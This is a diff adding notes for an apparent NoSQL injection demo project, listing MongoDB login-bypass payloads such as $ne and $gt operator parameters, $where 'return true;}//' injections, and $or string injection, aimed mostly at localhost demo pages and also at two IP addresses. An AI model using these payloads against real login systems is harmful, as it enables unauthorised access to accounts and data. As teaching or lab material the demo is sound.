@@ -1,0 +1,74 @@
+(1)
+Information-get
+http://localhost/github/NoSQLInjectionAttackDemo/demo.html
+http://localhost/github/NoSQLInjectionAttackDemo/detected_demo.html
+correct input:
+username:sunxiuyang
+password:123456
+
+wrong input:
+username:sunxiuyang
+password:12
+
+attack URL
+http://localhost/github/NoSQLInjectionAttackDemo/login/detected_login.php?username[$ne]=2&password[$ne]=r&login-submit=login
+
+attack URL by myself
+http://localhost/github/NoSQLInjectionAttackDemo/login/detected_login.php?username[$gt]=2&password[$gt]=1&login-submit=login
+gt mean more than
+
+
+(2)
+information-match
+http://localhost/github/NoSQLInjectionAttackDemo/demo_1.html
+correct url
+http://localhost/github/NoSQLInjectionAttackDemo/test_query1.php?username=1&password=1
+wrong url
+http://localhost/github/NoSQLInjectionAttackDemo/test_query1.php?username=1&password=1
+injection url
+http://localhost/injection/test_query1.php?username=1&password=2;return%20true;}//
+
+(3)
+mongoDB-match
+http://localhost/github/NoSQLInjectionAttackDemo/demo_1.html
+correct input:
+username:1
+password:1
+
+wrong input:
+username:1
+password:2
+
+attackURL:
+http://localhost/github/NoSQLInjectionAttackDemo/login/login_1.php?username=1&password=2;return%20true;}//
+
+
+
+(4)
+mongoDB-admin
+java version
+because this is kind of mongoshell
+
+username：123',$or:[{},{'a':'a 
+password：'}],$comment:'successful MongoDB
+
+mongoDB-register
+username：1234 
+password：1234','injection':'injection（自己发现的）
+
+
+http://10.0.0.61:80/injection/login/login.php?username=sunxiuyang&password[$gt]=&login-submit=login
+gt 大于
+
+(5)
+http://localhost/github/NoSQLInjectionAttackDemo/demo_2.html
+
+login success
+http://localhost/zend_workplace/NoSQLInjectionAttackDemo/login/demo_2.php?password=111&login-submit=submit
+
+attack url
+http://localhost/github/NoSQLInjectionAttackDemo/login/demo_2.php?password=123;return%20true;}//
+
+(6)
+http://219.223.240.36/NoSQLInjectionAttackDemo/demo_2.html
+3-Set App Path (Current: /NoSQLInjectionAttackDemo/login/demo_2.php?password=2)
